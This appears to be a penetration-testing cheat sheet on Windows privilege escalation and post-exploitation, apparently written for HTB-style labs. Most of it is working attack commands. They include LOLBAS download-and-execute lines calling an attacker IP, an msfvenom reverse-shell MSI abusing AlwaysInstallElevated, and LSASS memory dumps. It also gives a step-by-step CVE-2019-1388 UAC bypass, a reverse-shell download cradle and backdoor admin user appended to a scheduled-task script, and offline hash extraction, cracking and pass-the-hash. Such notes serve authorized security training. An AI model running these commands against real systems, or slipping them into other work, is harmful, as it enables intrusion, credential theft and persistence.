## Miscellaneous Techniques

These techniques cover several independent privilege escalation and post-exploitation methods that do not fit neatly into a single category but are frequently encountered and highly effective in real engagements. 

***

## LOLBAS - Living Off The Land Binaries and Scripts

LOLBAS are Microsoft-signed binaries already present on Windows systems that can be repurposed by attackers. Because they are trusted, signed, and part of the OS, they often bypass application whitelisting and antivirus. 

### Key LOLBAS Reference

```
https://lolbas-project.github.io/
Search by: function (execute, download, compile, etc.) or binary name
```

### High-Value LOLBAS Binaries

```powershell
# certutil.exe - certificate utility turned file transfer and encoding tool
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat  # download
certutil.exe -encode file1 encodedfile    # base64 encode (exfil or bypass)
certutil.exe -decode encodedfile file2    # base64 decode
certutil.exe -urlcache -split -f http://10.10.14.3:8080/nc.exe nc.exe        # download nc

# rundll32.exe - DLL executor
# Reverse shell via malicious DLL
rundll32.exe shell32.dll,Control_RunDLL evil.dll
# LSASS memory dump (credential theft)
rundll32.exe comsvcs.dll, MiniDump <lsass_PID> lsass.dmp full

# mshta.exe - HTML application host
mshta.exe http://10.10.14.3:8080/evil.hta           # remote HTA execution
mshta.exe javascript:a=(GetObject("script:http://10.10.14.3/evil.sct")).Exec();close();

# regsvr32.exe - COM object registration (AppLocker bypass)
regsvr32.exe /s /n /u /i:http://10.10.14.3/evil.sct scrobj.dll

# msiexec.exe - MSI installer
msiexec.exe /q /i http://10.10.14.3:8080/shell.msi   # remote MSI execution
msiexec.exe /quiet /qn /i payload.msi

# wmic.exe - WMI query tool
wmic.exe process call create "C:\Windows\Temp\shell.exe"
wmic.exe os get /format:"http://10.10.14.3/evil.xsl"  # remote XSL code execution

# cmstp.exe - connection manager installer (UAC bypass)
cmstp.exe /ni /s evil.inf

# installutil.exe - .NET installer (AppLocker bypass)
installutil.exe /logfile= /LogToConsole=false /U evil.exe

# odbcconf.exe - ODBC config tool
odbcconf.exe /f evil.rsp                    # execute DLL via RSP file

# expand.exe - cab/file expander
expand.exe \\10.10.14.3\share\shell.bat shell.bat   # file transfer

# xwizard.exe - extensible wizard host
# Can load COM objects - COM hijack opportunity
```

***

## AlwaysInstallElevated

Both HKCU and HKLM keys must be set to `1`. Any `.msi` file executed by any user then runs as `NT AUTHORITY\SYSTEM`. 

```cmd
:: Enumerate both required keys
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: Both must return 0x1 for the vector to be exploitable
```

```powershell
# PowerUp detection
Import-Module .\PowerUp.ps1
Get-RegistryAlwaysInstallElevated
# Returns True if vulnerable
```

```bash
# Generate reverse shell MSI on attack machine
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=9443 -f msi -o aie.msi
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=9443 -f msi -o aie64.msi

# Listener
nc -lnvp 9443
```

```cmd
:: Execute on target (no admin rights needed)
msiexec /i C:\Windows\Temp\aie.msi /quiet /qn /norestart
:: Flags: /quiet = no interaction, /qn = no UI, /norestart = no reboot prompt
:: Result: NT AUTHORITY\SYSTEM reverse shell
```

```powershell
# If no internet for msfvenom, use PowerUp's Write-UserAddMSI
Import-Module .\PowerUp.ps1
Write-UserAddMSI
# Creates UserAdd.msi on Desktop - adds backdoor user to Administrators via GUI prompt
msiexec /i UserAdd.msi
```

***

## CVE-2019-1388 - Windows Certificate Dialog UAC Bypass

This requires GUI access (RDP). Works on unpatched Windows systems prior to the November 2019 patch. The UAC dialog for certain old Microsoft-signed executables renders a hyperlink that opens a browser running as SYSTEM. 

```
Prerequisites:
- Low-privilege user account
- GUI / RDP access to target
- Target is unpatched pre-November 2019
- hhupd.exe (available from packetstormsecurity.com)

Exploit steps:
1. Right-click hhupd.exe -> Run as administrator
2. UAC prompt appears -> click "Show information about the publisher's certificate"
3. In certificate dialog -> Details tab, note SpcSpAgencyInfo is populated
4. Click back to General tab -> click the "Issued by:" hyperlink
5. Click OK to close dialog
6. Internet Explorer/Edge opens running as SYSTEM (verify in Task Manager)
7. Right-click page -> View Page Source
8. New tab opens -> right-click -> Save As
9. In Save As dialog File Name field type: C:\Windows\System32\cmd.exe
10. Press Enter -> cmd.exe spawns as NT AUTHORITY\SYSTEM

Affected versions (check against lolbas link in source material):
- Windows Server 2008 R2 through Server 2019 (pre-patch)
- Windows 7 through Windows 10 1903 (pre-patch)
```

***

## Scheduled Task Abuse

```cmd
:: Enumerate all scheduled tasks verbosely (shows Run As User)
schtasks /query /fo LIST /v | findstr /i "TaskName\|Run As User\|Task To Run\|Status"

:: Filter specifically for SYSTEM tasks
schtasks /query /fo LIST /v | findstr /i "SYSTEM" -A 5 -B 5
```

```powershell
# PowerShell enumeration with more detail
Get-ScheduledTask | Select-Object TaskName, TaskPath, State |
    Where-Object {$_.State -ne "Disabled"}

# Get full task details including action and run-as context
Get-ScheduledTask | ForEach-Object {
    $task = $_
    $info = Get-ScheduledTaskInfo $task.TaskName -ErrorAction SilentlyContinue
    $action = $task.Actions | Select-Object -First 1
    [PSCustomObject]@{
        Name    = $task.TaskName
        Execute = $action.Execute
        Args    = $action.Arguments
        RunAs   = $task.Principal.UserId
        State   = $task.State
    }
} | Where-Object {$_.RunAs -match "SYSTEM|Administrator"} | Format-Table -AutoSize
```

### Exploiting Weak Task Script Permissions

```powershell
# Find scripts or binaries referenced by scheduled tasks
Get-ScheduledTask | ForEach-Object {
    $_.Actions | Where-Object {$_.Execute} | ForEach-Object {
        $path = $_.Execute -replace '"',''
        if (Test-Path $path) {
            $acl = Get-Acl $path -ErrorAction SilentlyContinue
            [PSCustomObject]@{ Path = $path; ACL = $acl.AccessToString }
        }
    }
}

# Check write access to any directory in the task's script path
accesschk64.exe /accepteula -s -d C:\Scripts\
# BUILTIN\Users: RW = any user can modify scripts in this folder
```

```powershell
# Once a writable script is found, append a payload
# Append reverse shell to backup script that runs nightly
$payload = "`nIEX(New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/shell.ps1')"
Add-Content -Path "C:\Scripts\db-backup.ps1" -Value $payload

# Or add a local admin user
$payload = "`nnet user hacker Pass1! /add; net localgroup administrators hacker /add"
Add-Content -Path "C:\Scripts\db-backup.ps1" -Value $payload
```

***

## User/Computer Description Fields

```powershell
# Local users - Description field often stores temp passwords set by IT
Get-LocalUser | Select-Object Name, Enabled, Description
# Look for entries like: "Password: Summer2021!" or "Temp pass: Welcome1"

# Computer description field
Get-WmiObject -Class Win32_OperatingSystem | Select-Object Description

# Active Directory equivalent (if domain-joined)
Get-ADUser -Filter * -Properties Description | Where-Object {$_.Description} |
    Select-Object SamAccountName, Description

Get-ADComputer -Filter * -Properties Description | Where-Object {$_.Description} |
    Select-Object Name, Description
```

***

## Mounting VHDX/VMDK Files for Offline Hash Extraction

Virtual disk files found on backup shares or SMB shares often contain SAM/SYSTEM hives or even NTDS.dit from domain controllers. 

### On Linux

```bash
# Install required tools
sudo apt install libguestfs-tools kpartx

# Mount VMDK (VMware)
sudo guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
# -a = disk image, -i = auto inspect partitions, --ro = read only

# Mount VHDX (Hyper-V)
sudo guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx -m /dev/sda1
# -m = specify partition manually if -i fails

# Alternative method for VMDK using kpartx
sudo kpartx -av disk.vmdk
# Creates /dev/mapper/loop0p1, loop0p2 etc.
sudo mount -o ro /dev/mapper/loop0p2 /mnt/vmdk

# Extract hive files
sudo cp /mnt/vmdk/Windows/System32/config/SAM ./
sudo cp /mnt/vmdk/Windows/System32/config/SYSTEM ./
sudo cp /mnt/vmdk/Windows/System32/config/SECURITY ./

# If it is a domain controller
sudo cp /mnt/vmdk/Windows/NTDS/ntds.dit ./

# Dump hashes offline
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL

# DC hash dump
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### On Windows

```powershell
# Mount VHD/VHDX via PowerShell
Mount-VHD -Path "C:\Backups\WEBSRV10.vhdx" -ReadOnly
# Appears as a new drive letter (e.g., E:\)

# Unmount when done
Dismount-VHD -Path "C:\Backups\WEBSRV10.vhdx"

# For VMDK: use VMware Workstation -> File -> Map Virtual Disks
# Or 7-Zip can extract contents from .vmdk directly without mounting

# Once mounted, extract SAM hive files
copy "E:\Windows\System32\config\SAM" C:\Windows\Temp\
copy "E:\Windows\System32\config\SYSTEM" C:\Windows\Temp\
copy "E:\Windows\System32\config\SECURITY" C:\Windows\Temp\
```

### Cracking Extracted Hashes

```bash
# Dump NTLM hashes from extracted hives
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
# Output: Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
#         Format: username:RID:LMhash:NThash:::

# Extract just NT hashes for hashcat
grep ":::" dump.txt | cut -d: -f4 > hashes.txt

# Crack with hashcat (mode 1000 = NTLM)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Pass-the-hash if cracking fails (use NT hash directly)
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58 administrator@10.129.43.33
evil-winrm -i 10.129.43.33 -u administrator -H cf3a5525ee9414229e66279623ed5c58
```

***

## Miscellaneous Checklist

```powershell
# 1. LOLBAS file transfer (bypass blocked outbound tools)
certutil.exe -urlcache -split -f http://10.10.14.3:8080/winpeas.exe winpeas.exe

# 2. AlwaysInstallElevated check
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 3. Description fields
Get-LocalUser | Select-Object Name,Description | Where-Object {$_.Description}
Get-WmiObject -Class Win32_OperatingSystem | Select-Object Description

# 4. Writable scheduled task scripts
schtasks /query /fo LIST /v | findstr "SYSTEM" -A 10 -B 2
accesschk64.exe /accepteula -s -d C:\Scripts\ C:\Tasks\ C:\AutoRun\

# 5. Virtual disk hunting
Get-ChildItem C:\ -Recurse -Include *.vmdk,*.vhd,*.vhdx -ErrorAction SilentlyContinue |
    Select-Object FullName, Length, LastWriteTime

# 6. LSASS dump via LOLBAS (if no AV or bypassed)
$lsassPID = (Get-Process lsass).Id
rundll32.exe comsvcs.dll, MiniDump $lsassPID C:\Windows\Temp\lsass.dmp full
# Transfer lsass.dmp to attack machine
# pypykatz lsa minidump lsass.dmp   OR   mimikatz sekurlsa::minidump lsass.dmp
```
